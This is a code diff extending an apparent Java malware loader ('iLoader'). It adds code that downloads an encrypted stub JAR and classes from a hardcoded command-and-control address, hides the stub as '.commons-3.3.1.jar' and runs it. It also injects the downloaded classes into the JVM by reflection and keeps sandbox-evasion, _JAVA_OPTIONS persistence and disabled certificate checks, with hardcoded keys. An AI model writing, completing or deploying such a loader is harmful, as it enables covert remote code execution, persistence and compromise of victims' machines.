@@ -47,6 +47,7 @@ import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.LinkOption;
+import java.nio.file.NoSuchFileException;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.rmi.Naming;
@@ -95,11 +96,12 @@ import java.awt.Toolkit;
 
 public class iLoader
 {
-    static public String urlData = "https://192.168.1.157/59009";
+    static public String urlData = "https://192.168.1.157/";
     static public String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
     static public String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
     static public String envVar = "_JAVA_OPTIONS";
     static public String jarPath = "";
+    static public String stubPath = "";
     static public boolean isAgent = true;
     static public String currentClass = "";
     static public int virtThreshold = 10; //5 for when it's ready
@@ -110,7 +112,7 @@ public class iLoader
     //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nLoader\*.java
     //cd src\main\java
     //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\lib\iLoader.jar ..\..\..\MANIFEST.txt .\com\nocebo\nLoader\*.class
-    public static void main(String[] args) throws IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
+    public static void main(String[] args) throws Exception, IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
     {
         Class currentClass = MethodHandles.lookup().lookupClass();
         passThroughJar(getObfuscatedName(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()),args);
@@ -121,7 +123,7 @@ public class iLoader
         coreOp();
     }
 
-    public static void premain(String agentArgs, Instrumentation inst) throws InstantiationException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
+    public static void premain(String agentArgs, Instrumentation inst) throws Exception, InstantiationException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
         System.out.println("iLoader");
         //TimeUnit.MILLISECONDS.sleep((rngenerator(2,5))*1000);
@@ -130,52 +132,48 @@ public class iLoader
         coreOp();
         System.out.println("finished core op");
         
-
-        Hashtable<String,byte[]> classData = classRequest();
+        
+        Hashtable<String,byte[]> classData = downloadRequest(String.format("%s%s",urlData,"59009"));
         Enumeration<String> b = classData.keys();
 
-        
-        while (b.hasMoreElements())
+        if (!classData.containsKey("error") && System.getProperty("sun.java.command").contains(stubPath))
         {
-            String bData = b.nextElement();
-            byte[] classBytes = classData.get(bData);
-            
-            Method defineNewClass = ClassLoader.class.getDeclaredMethod("defineClass",
-                                      String.class, byte[].class, int.class, int.class);
-            defineNewClass.setAccessible(true);
-            defineNewClass.invoke(
-                ClassLoader.getSystemClassLoader(),
-                String.format("com.nocebo.nCore.%s",bData),
-                classBytes,
-                0,
-                classBytes.length
-            );
+            while (b.hasMoreElements())
+            {
+                String bData = b.nextElement();
+                byte[] classBytes = classData.get(bData);
                 
-           
+                Method defineNewClass = ClassLoader.class.getDeclaredMethod("defineClass",
+                                        String.class, byte[].class, int.class, int.class);
+                defineNewClass.setAccessible(true);
+                defineNewClass.invoke(
+                    ClassLoader.getSystemClassLoader(),
+                    String.format("com.nocebo.nCore.%s",bData),
+                    classBytes,
+                    0,
+                    classBytes.length
+                );
+            }
         }
-        
-
-            Class.forName("com.nocebo.nCore.iAgent");
-
-
-
-        //need to just make 
-    }
-
-    
-
-    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
-    {
-        TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
-        //sleep 30-45 (seconds for testing, minutes for release)
-        //for attach execution
-        coreOp();
-
-        
+        else
+        {
+            System.out.println("not stub");
+            /*
+            passThroughJar(stubPath, new String[]{});
+            try 
+            {
+                Files.delete(Paths.get(stubPath));
+            } 
+            catch (Exception x) 
+            {
+                
+            }  
+            */
+        }
     }
 
 
-    public static void coreOp() throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
+    public static void coreOp() throws Exception, IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
     {
         if (!chkSandbox())
         {
@@ -185,11 +183,22 @@ public class iLoader
             //chk for persistence and add if not present
             if (!chkPersistence() && isAgent)
             {
+                getStubJar();
                 mkPersistence();
             }
             else if (!chkPersistence() && !isAgent)
             {
+                getStubJar();
                 mkPersistence();
+                passThroughJar(stubPath, new String[]{});
+                /*
+                try 
+                {
+                    Files.delete(Paths.get(stubPath));
+                } 
+                catch (Exception x) 
+                {}
+                */
                 System.exit(0);                
             }
 
@@ -222,6 +231,20 @@ public class iLoader
         }
     }
 
+    public static byte[] getStubJar() throws Exception, URISyntaxException, NoSuchAlgorithmException, KeyManagementException, IOException
+    {
+        String stubName = ".commons-3.3.1";
+        String workingDir = System.getProperty("user.dir");
+        stubPath = String.format("%s%s%s.jar",new File(workingDir).getAbsolutePath(),File.separator,stubName);  
+        Hashtable<String,byte[]> stubData = downloadRequest(String.format("%s%s",urlData,"59013"));
+        Files.write(Paths.get(stubPath), stubData.get("stub"));
+        if (System.getenv("os.name").toLowerCase().contains("win"))
+        {
+            Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+        }                    
+        return stubData.get("nonce");   
+    }
+
     public static String getObfuscatedName(String pathToJar)
     {
         String[] nameValRaw = pathToJar.split("/");
@@ -243,9 +266,7 @@ public class iLoader
         catch (Exception e)
         {
             return false;
-        }   
-        //System.out.println(envVarVal);
-
+        }  
         if (envVarVal == null)
         {
             return false;
@@ -293,13 +314,13 @@ public class iLoader
     
     
 
-    private static Hashtable<String,byte[]> classRequest() throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
+    private static Hashtable<String,byte[]> downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
         //stackoverflow provided boilerplate
         SSLContext sslCon = SSLContext.getInstance("TLS");
         sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
 
-        URL ctrlUrl = new URI(urlData).toURL();
+        URL ctrlUrl = new URI(finalUrl).toURL();
 
         HttpsURLConnection connMan;
         try
@@ -336,36 +357,20 @@ public class iLoader
                 String responseData = connInReader.readLine();
                 connInReader.close();
                 Hashtable<String,byte[]> decodedResponseData = new Hashtable();
-                if (!responseData.contains("error"))
+                
+                if (!responseData.contains("error") && finalUrl.contains("59009"))
                 {
-                    
-                    String[] rDataSet = responseData.split("\\|");
-                    
-
-                    for (int r=0;r<rDataSet.length;r++)
-                    {                
-
-                        String[] rData = rDataSet[r].split("\\.");
-                        String cNameData = new String(
-                            Base64.getDecoder().decode(
-                                rData[0].getBytes()
-                            )
-                        );
-                        
-
-                        decodedResponseData.put(
-                            cNameData,
-                            decrypt(
-                                    Base64.getDecoder().decode(
-                                        rData[1].getBytes()
-                                    ),
-                                    agentKey.getBytes(),
-                                    nonceData.getBytes()
-                                )        
-                            );     
-                        
-                    }
+                    decodedResponseData = decodeClasses(responseData, nonceData);
                 }
+                else if (!responseData.contains("error") && finalUrl.contains("59013"))
+                {
+                    decodedResponseData = decodeJar(responseData, nonceData);
+                }
+                else
+                {
+                    decodedResponseData.put("error",responseData.getBytes());
+                }
+                
                 return decodedResponseData;
 
             }
@@ -386,6 +391,55 @@ public class iLoader
             hashedResponse.put("error",e.getMessage().getBytes());
             return hashedResponse;
         }
+    }
+
+    public static Hashtable<String,byte[]> decodeClasses(String responseData, String nonceData) throws Exception, NoSuchAlgorithmException, KeyManagementException, IOException
+    {
+        Hashtable<String,byte[]> decodedResponseData = new Hashtable();
+        String[] rDataSet = responseData.split("\\|");
+                    
+        for (int r=0;r<rDataSet.length;r++)
+        {                
+
+            String[] rData = rDataSet[r].split("\\.");
+            String cNameData = new String(
+                Base64.getDecoder().decode(
+                    rData[0].getBytes()
+                )
+            );
+            
+
+            decodedResponseData.put(
+                cNameData,
+                decrypt(
+                        Base64.getDecoder().decode(
+                            rData[1].getBytes()
+                        ),
+                        agentKey.getBytes(),
+                        nonceData.getBytes()
+                    )        
+                );     
+        } 
+        return decodedResponseData;                
+                    
+    }
+
+    public static Hashtable<String,byte[]> decodeJar(String responseData, String nonceData) throws Exception, NoSuchAlgorithmException, KeyManagementException, IOException
+    {
+        Hashtable<String,byte[]> decodedResponseData = new Hashtable();
+
+        decodedResponseData.put(
+                "stub",
+                decrypt(
+                        Base64.getDecoder().decode(
+                            responseData.getBytes()
+                        ),
+                        agentKey.getBytes(),
+                        nonceData.getBytes()
+                    )        
+                );
+
+        return decodedResponseData;   
     }
 
     //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
